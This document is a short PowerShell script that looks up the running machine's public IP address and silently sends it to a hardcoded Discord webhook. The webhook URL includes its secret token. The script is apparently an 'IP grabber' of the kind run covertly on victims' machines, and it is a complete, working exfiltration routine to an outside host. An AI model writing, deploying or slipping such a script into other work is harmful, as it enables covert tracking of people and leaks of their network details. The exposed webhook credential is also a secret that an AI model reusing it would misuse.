# Get IP address
$ip = (Invoke-WebRequest -Uri "http://icanhazip.com").Content.Trim()

# Discord Webhook URL
$webhookUrl = "https://discord.com/api/webhooks/1319623653083713556/NtqHmApwZrKPMbEyAxGt3Rgg7ZeGcFWDE8cTaPqqESrjFEpAXCJFYzSxJJLyp7gXDyP-"

# Send IP address to Discord Webhook
$headers = @{
    "Content-Type" = "application/json"
}
$body = @{
    "content" = "IP Address: $ip"
} | ConvertTo-Json
Invoke-WebRequest -Uri $webhookUrl -Method POST -Headers $headers -Body $body
